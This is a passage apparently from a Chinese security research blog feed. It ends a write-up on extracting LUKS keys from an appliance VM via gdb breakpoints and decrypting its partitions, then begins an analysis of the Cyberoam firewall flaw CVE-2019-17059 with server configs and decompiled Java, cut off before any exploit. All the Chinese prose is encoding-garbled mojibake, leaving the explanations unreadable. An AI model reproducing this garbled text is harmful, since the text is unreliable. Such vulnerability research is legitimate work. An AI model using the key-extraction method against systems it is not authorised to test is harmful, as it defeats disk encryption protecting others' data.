<p>åŠ è½½ gcry_rijndael ç­‰æ¨¡å—ï¼Œä¹‹åé€šè¿‡æœç´¢ LUKS.mod ä¸­ç‰¹æ®Šå­—ç¬¦ä¸²æ¥å®šä½å…³é”®ä»£ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find 0,0x8000000,&quot;Trying keyslot %d\n&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-14.png"
                     
                ></p>
<p>è¿™é‡Œæ‰¾åˆ°ä¸¤ä¸ªç»“æœï¼Œä¾æ¬¡ä»æ¯ä¸ªåœ°å€é™„è¿‘æŸ¥æ‰¾å…³é”®ä»£ç ï¼Œä¾‹å¦‚è¿›è¡Œä»¥ä¸‹æœç´¢</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">x /30i 0x7f56fb7 - 0xbf0</span><br></pre></td></tr></table></figure></div>

<p>ç»§ç»­å‘ä¸‹æ‰¾åˆ°å…³é”®å‡½æ•°å¼€å¤´</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-15.png"
                     
                ></p>
<p>æ ¹æ®æŒ‡ä»¤åç§»é‡æ‰¾åˆ°å…³é”®ä½ç½®</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-16.png"
                     
                ></p>
<p>è¿™äº›æŒ‡ä»¤åºåˆ—å’Œ IDA å¯¹åº”ä½ç½®ç›¸åŒ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-17.png"
                     
                ></p>
<p>åœ¨ call æŒ‡ä»¤ä¸‹æ–­ç‚¹ï¼Œç„¶åè®©ç³»ç»Ÿç»§ç»­è¿è¡Œï¼Œæ¥ç€åœ¨å‘½ä»¤è¡Œä¸­è§£å¯† gpt3 åˆ†åŒºï¼Œgdb å°†ä¼šæ–­ä¸‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-18.png"
                     
                ></p>
<p>æ­¤æ—¶ rcx å¯„å­˜å™¨å€¼è¡¨ç¤ºå¯†é’¥çš„é•¿åº¦ï¼Œè€Œåœ¨ rdx å¯„å­˜å™¨æŒ‡å‘çš„åœ°å€ä¸­å°±èƒ½æ‰¾åˆ°è§£å¯†åˆ†åŒºä½¿ç”¨çš„å¯†é’¥</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-19.png"
                     
                ></p>
<h4 id="è§£å¯†æ–‡ä»¶"><a href="#è§£å¯†æ–‡ä»¶" class="headerlink" title="è§£å¯†æ–‡ä»¶"></a>è§£å¯†æ–‡ä»¶</h4><p>æˆ‘ä»¬å·²ç»è·å–è§£å¯† gpt3 åˆ†åŒºçš„å¯†é’¥ï¼Œæ¥ä¸‹æ¥å¯ä»¥åœ¨æœ¬åœ° Linux ç³»ç»Ÿä¸­å°è¯•è§£å¯†åˆ†åŒºã€‚</p>
<p>å°† vmdk é‡æ–°æŒ‚è½½åˆ°æœ¬åœ° Linux ç³»ç»Ÿï¼Œå¹¶æŠŠè°ƒè¯•å¾—åˆ°çš„å¯†é’¥ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°è¯•è§£å¯†ã€‚</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> key_p3 | sudo cryptsetup luksOpen /dev/sdb3 p3    <span class="comment"># è§£å¯†åˆ†åŒº</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/mapper/p3 of=./part3    <span class="comment"># æŸäº›æƒ…å†µä¸‹æŒ‚è½½åˆ†åŒºä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬å°†åˆ†åŒºæ‹·è´åˆ°  Windows ä¸‹è§£å‹</span></span><br></pre></td></tr></table></figure></div>

<p>å°†ç”Ÿæˆçš„ part3 åˆ†åŒºæ–‡ä»¶è§£å‹å³å¯å¾—åˆ°è§£å¯†åçš„æ–‡ä»¶ç³»ç»Ÿ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-20.png"
                     
                ></p>
<p>åŒç†ï¼Œå¯¹äºå‰©ä¸‹çš„å‡ ä¸ªåŠ å¯†åˆ†åŒºä¹Ÿèƒ½é€šè¿‡åŒæ ·çš„æ–¹å¼å®ç°è§£å¯†ã€‚</p>
<h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a class="link"   href="https://cloud.tencent.com/developer/article/1087439" >qemu-nbdæŠ€æœ¯åˆ†æ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.ajfriesen.com/decrypt-and-mount-luks-volume-in-grub-rescue-mode/" >Decrypt and mount LUKS volume in GRUB rescue mode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="http://pavelhan.tech/post/2020-07-07-00-Linux%E7%9A%84%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AFLUKS/" >Linuxçš„ç£ç›˜åŠ å¯†æŠ€æœ¯LUKS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æœ¬æ–‡æœªæ”¶å–ç¨¿è´¹</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2019-17059</title>
    <url>/2021/12/14/CVE-2019-17059/</url>
    <content><![CDATA[<p>2019 å¹´ 10 æœˆ 1 æ—¥ï¼ŒCVE å®˜æ–¹å‘å¸ƒäº†ç¼–å·ä¸º CVE-2019-17059 çš„æ¼æ´ï¼šCyberoam é˜²ç«å¢™ä»»æ„ä»£ç æ‰§è¡Œã€‚æœ¬æ–‡å¯¹æ­¤æ¼æ´è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<p>æ¼æ´çš„å‘ç°è€…åœ¨ 2019 å¹´ 10 æœˆ 7 æ—¥å·¦å³å‘å¸ƒäº†å…³äºæ­¤æ¼æ´çš„<a class="link"   href="https://thebestvpn.com/cyberoam-preauth-rce/" >å…·ä½“ä¿¡æ¯<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œä½†æ–‡ç« ä¸­éšè—äº†å¾ˆå¤šå…³é”®ç»†èŠ‚ã€‚</p>
<h2 id="A-æ•°æ®å¤„ç†æµç¨‹"><a href="#A-æ•°æ®å¤„ç†æµç¨‹" class="headerlink" title="A. æ•°æ®å¤„ç†æµç¨‹"></a>A. æ•°æ®å¤„ç†æµç¨‹</h2><p>Cyberoam åº•å±‚ä½¿ç”¨ä¸€ä¸ªä¿®æ”¹è¿‡çš„ Linux ç³»ç»Ÿï¼Œæ•´ä½“æ¡†æ¶è®¾è®¡æ¯”è¾ƒå¤æ‚ï¼ŒåŒ…å«ä¸€ä¸ª JAVA ç¼–å†™çš„å‰ç«¯æœåŠ¡ï¼Œä»¥åŠ Embedded perl ç¼–å†™çš„åç«¯æœåŠ¡ï¼Œå‰åç«¯é€šè¿‡ä¸€ç§è‡ªå®šä¹‰çš„ç±» HTTP æ ¼å¼æ•°æ®è¿›è¡Œé€šä¿¡ã€‚</p>
<h3 id="A-1-å‰ç«¯"><a href="#A-1-å‰ç«¯" class="headerlink" title="A.1 å‰ç«¯"></a>A.1 å‰ç«¯</h3><p>netstat æŸ¥çœ‹ç«¯å£ç›‘å¬æƒ…å†µï¼Œå‘ç°ç›‘å¬ 80 ç«¯å£çš„æœåŠ¡å¯åŠ¨å‘½ä»¤ä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache -d /_conf/httpd</span><br></pre></td></tr></table></figure></div>

<p>æ¥åˆ° &#x2F;_conf&#x2F;httpd&#x2F;conf ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ° apache ç›¸å…³é…ç½®æ–‡ä»¶ httpd.confï¼Œå…¶å†…éƒ¨ä¼šå¼•ç”¨å­æ–‡ä»¶ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Include /cfs/web/apache/httpd.conf</span><br></pre></td></tr></table></figure></div>

<p>&#x2F;cfs&#x2F;web&#x2F;apache&#x2F;httpd.confï¼Œå†…å®¹å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Listen 80</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">ServerName manage.cyberoam</span><br><span class="line">&lt;Proxy *&gt;</span><br><span class="line">AddDefaultCharset utf-8</span><br><span class="line">&lt;/Proxy&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteRule	/WEB-INF/* - [F]</span><br><span class="line">RewriteRule	/properties/* - [F]</span><br><span class="line">RewriteRule ^/$ /corporate/webpages/login.jsp [R=302]</span><br><span class="line">ErrorDocument 500 /error/INTERNAL_SERVER_ERROR.html</span><br><span class="line">ErrorDocument 503 /error/APP_SERVER_NOT_AVAILABLE.html</span><br><span class="line">ErrorDocument 404 /error/FILE_NOT_EXISTS.html</span><br><span class="line">ProxyPass /corporate/images !</span><br><span class="line">ProxyPass /corporate/dg !</span><br><span class="line">ProxyPass /corporate/APIController !</span><br><span class="line">ProxyPass /corporate/iview/images !</span><br><span class="line">ProxyPass /corporate/iview/css !</span><br><span class="line">ProxyPass /corporate/iview/javascript !</span><br><span class="line">ProxyPass /corporate/iview/FusionCharts !</span><br><span class="line">ProxyPass /corporate/iview/graycss !</span><br><span class="line">ProxyPass /corporate/iview/grayimages !</span><br><span class="line">ProxyPass /corporate/iview/defaultcss !</span><br><span class="line">ProxyPass /corporate/iview/defaultimages !</span><br><span class="line">ProxyPass /corporate/iview/lite1css !</span><br><span class="line">ProxyPass /corporate/iview/lite1images !</span><br><span class="line">ProxyPass /corporate/iview/lite2css !</span><br><span class="line">ProxyPass /corporate/iview/lite2images !</span><br><span class="line">ProxyPass /corporate/iview/jqplot !</span><br><span class="line">ProxyPass /corporate http://localhost:8009/corporate</span><br><span class="line">ProxyPassReverse /corporate http://localhost:8009/corporate</span><br><span class="line">ProxyPass /corporate/iview http://localhost:8009/corporate/iview</span><br><span class="line">ProxyPassReverse /corporate/iview http://localhost:8009/corporate/iview</span><br><span class="line">RewriteRule ^/portal(/)?$ - [F]</span><br><span class="line">RewriteRule /corporate/webpages/tportal/* - [F]</span><br><span class="line">ProxyPass /registrationserver http://cyberoamupdate.cyberoam.com/demoregserver/servlet/CyberoamSyncManager retry=0</span><br><span class="line">ProxyPassReverse /registrationserver http://cyberoamupdate.cyberoam.com/demoregserver/servlet/CyberoamSyncManager</span><br><span class="line">ProxyPass /notificationmsg http://cyberoamregistration.cyberoam.com/datetime/notificationmsg.jsp retry=0</span><br><span class="line">ProxyPassReverse /notificationmsg http://cyberoamregistration.cyberoam.com/datetime/notificationmsg.jsp</span><br><span class="line">ProxyPreserveHost On</span><br><span class="line">RewriteEngine   On</span><br><span class="line">Rewritecond  %&#123;request_method&#125; !^(GET|POST)$</span><br><span class="line">RewriteRule .* - [F]</span><br><span class="line">ExpiresActive On</span><br><span class="line">ExpiresDefault &quot;access plus 1 month&quot;</span><br><span class="line">AddOutputFilterByType DEFLATE text/plain</span><br><span class="line">AddOutputFilterByType DEFLATE text/html</span><br><span class="line">AddOutputFilterByType DEFLATE text/css</span><br><span class="line">AddOutputFilterByType DEFLATE application/javascript</span><br><span class="line">AddOutputFilterByType DEFLATE application/x-javascript</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œçœ‹åˆ°ç›‘å¬å¤–éƒ¨ 80 ç«¯å£çš„æœåŠ¡é…ç½®ï¼Œå½“ç”¨æˆ·è®¿é—® &#x2F;corporate æ¥å£æ—¶ï¼Œè¯·æ±‚ä¼šè¢«è½¬å‘åˆ° <a class="link"   href="http://localhost:8009/corporate%EF%BC%8Ctomcat" >http://localhost:8009/corporateï¼Œtomcat<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ç›‘å¬æ­¤æ¥å£ï¼Œå¯åŠ¨å‘½ä»¤ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat -X mx64M -X ms12M -X ss128k -X asyncgc -X noinlining -X replication:none -X compactalways -D java.io.tmpdir=/tmp-Djava.awt.headless=true -D jetty.class.path=/bin/jetty/lib/javax.servlet.jar:/bin/jetty/lib/org.mortbay.jetty.jar:/bin/jetty/webapps/corporate/properties:/bin/jetty/webapps/corporate/jar/jta26.jar:/bin/jetty/webapps/reports/properties -X bootclasspath:/bin/jamvm/share/jamvm/classes:/bin/classpath/share/classpath -D STOP.PORT=-1 -jar /bin/jetty/start.jar /bin/jetty/etc/jetty.xml</span><br></pre></td></tr></table></figure></div>

<p>jetty.xml éƒ¨åˆ†é…ç½®</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Configure</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Mort Bay Consulting//DTD Configure//EN&quot;</span> <span class="string">&quot;http:/&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!-- Configure the Jetty Server                                      --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;Configure class=&quot;</span>org.mortbay.jetty.Server<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- Increase Maximum Form Content Size                              --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Call class=&quot;</span>java.lang.System<span class="string">&quot; name=&quot;</span>setProperty<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Arg&gt;org.mortbay.http.HttpRequest.maxFormContentSize&lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Arg&gt;4194304&lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;/Call&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  </span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- Configure the Request Listeners                                 --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- Add and configure a HTTP listener to port 8080                       --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- The default port can be changed using: java -Djetty.port=80     --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Call name=&quot;</span>addListener<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;New class=&quot;</span>org.mortbay.http.SocketListener<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>Port<span class="string">&quot;&gt;&lt;SystemProperty name=&quot;</span>jetty.port<span class="string">&quot; default=&quot;</span>8009<span class="string">&quot;/&gt;&lt;/S&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">		&lt;Set name=&quot;</span>PoolName<span class="string">&quot;&gt;P1&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>MinThreads<span class="string">&quot;&gt;20&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>MaxThreads<span class="string">&quot;&gt;200&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>lowResources<span class="string">&quot;&gt;50&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>MaxIdleTimeMs<span class="string">&quot;&gt;30000&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>LowResourcePersistTimeMs<span class="string">&quot;&gt;2000&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>acceptQueueSize<span class="string">&quot;&gt;0&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>ConfidentialPort<span class="string">&quot;&gt;8443&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>IntegralPort<span class="string">&quot;&gt;8443&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;/New&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;/Call&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Set name=&quot;</span>WebApplicationConfigurationClassNames<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Array type=&quot;</span>java.lang.String<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Item&gt;org.mortbay.jetty.servlet.XMLConfiguration&lt;/Item&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Item&gt;org.mortbay.jetty.servlet.JettyWebConfiguration&lt;/Item&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;!--</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Item&gt;org.mortbay.jetty.servlet.TagLibConfiguration&lt;/Item&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Item&gt;org.mortbay.jetty.servlet.jsr77.Configuration&lt;/Item&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;/Array&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- Configure the Contexts                                          --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Set name=&quot;</span>rootWebApp<span class="string">&quot;&gt;root&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  </span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Call name=&quot;</span>addWebApplications<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg&gt;&lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg&gt;&lt;SystemProperty name=&quot;</span>jetty.home<span class="string">&quot; default=&quot;</span>.<span class="string">&quot;/&gt;/webapps/&lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg&gt;&lt;SystemProperty name=&quot;</span>jetty.home<span class="string">&quot; default=&quot;</span>.<span class="string">&quot;/&gt;/etc/webdefault.xml&lt;/A&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg type=&quot;</span>boolean<span class="string">&quot;&gt;true&lt;/Arg&gt;&lt;!--extract WARs--&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg type=&quot;</span>boolean<span class="string">&quot;&gt;false&lt;/Arg&gt;&lt;!-- java 2 compliant class loader --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;/Call&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- Configure the Request Log                                       --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Set name=&quot;</span>RequestLog<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;New class=&quot;</span>org.mortbay.http.NCSARequestLog<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">	&lt;Arg&gt;&lt;SystemProperty name=&quot;</span>logs<span class="string">&quot; default=&quot;</span>/<span class="string">&quot; /&gt;/log/tomcat.log&lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Set name=&quot;</span>retainDays<span class="string">&quot;&gt;0&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Set name=&quot;</span>append<span class="string">&quot;&gt;true&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Set name=&quot;</span>extended<span class="string">&quot;&gt;false&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Set name=&quot;</span>buffered<span class="string">&quot;&gt;false&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Set name=&quot;</span>LogTimeZone<span class="string">&quot;&gt;GMT&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;/New&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;/Configure&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œæ‰¾åˆ° web ç›®å½•åœ¨ &#x2F;bin&#x2F;jetty&#x2F;webapps&#x2F;corporate&#x2F; ä¸‹ï¼Œweb.xml éƒ¨åˆ†é…ç½®</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>                                   </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Controller<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Controller<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>                                                                                                                             </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>APIController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>                                                                                            </span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/APIController<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>                                                                                             </span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>                                   </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Controller<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/sslvpnuserportal/manager/CRSSLAuthenticationManager<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>                                   </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RefreshServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/corporate/servlet/RefreshServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>                                   </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>TelnetServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/corporate/servlet/TelnetServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ä»é…ç½®ä¸­å¯ä»¥çœ‹åˆ°å‰ç«¯æœ‰å‡ ä¸ªå¯è®¿é—®çš„æ¥å£ï¼Œå…¶ä¸­ &#x2F;Controller æ¯”è¾ƒå…³é”®ï¼Œå®ƒå¯¹åº”çš„ç±»å®šä¹‰å¦‚ä¸‹</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Controller<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cyberoam.corporate.servlets.CyberoamCommonServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>åç¼–è¯‘è¿™ä¸ªç±»ï¼Œéƒ¨åˆ†ä»£ç ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    int1 = Integer.parseInt(httpServletRequest2.getParameter(<span class="string">&quot;mode&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex2) &#123;</span><br><span class="line">    int1 = -<span class="number">447</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (!eventByMode.getOPCode().equals(<span class="string">&quot;login&quot;</span>) &amp;&amp; !eventByMode.getOPCode().equals(<span class="string">&quot;iview_login&quot;</span>) &amp;&amp; eventByMode.getMode() != <span class="number">500</span> &amp;&amp; eventByMode.getMode() != <span class="number">172</span> &amp;&amp; eventByMode.getMode() != <span class="number">404</span> &amp;&amp; eventByMode.getMode() != <span class="number">34</span> &amp;&amp; eventByMode.getMode() != <span class="number">405</span> &amp;&amp; !eventByMode.getOPCode().equals(<span class="string">&quot;login_report&quot;</span>) &amp;&amp; eventByMode.getMode() != <span class="number">451</span> &amp;&amp; eventByMode.getMode() != <span class="number">458</span> &amp;&amp; !eventByMode.getOPCode().equals(<span class="string">&quot;ccc_login&quot;</span>) &amp;&amp; eventByMode.getMode() != <span class="number">603</span> &amp;&amp; eventByMode.getMode() != <span class="number">746</span> &amp;&amp; eventByMode.getMode() != <span class="number">958</span> &amp;&amp; eventByMode.getMode() != <span class="number">605</span> &amp;&amp; eventByMode.getMode() != <span class="number">531</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (eventByMode.getMode() != <span class="number">720</span> &amp;&amp; CheckSession.isAdminSessionLock(httpServletRequest2)) &#123;</span><br><span class="line">        httpServletResponse.getWriter().print(<span class="string">&quot;&#123;\&quot;status\&quot;:597,message:\&quot;Session is Lock\&quot;&#125;&quot;</span>);</span><br><span class="line">        CyberoamLogger.debug(<span class="string">&quot;CSC&quot;</span>, <span class="string">&quot;Lock Response is: 597&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    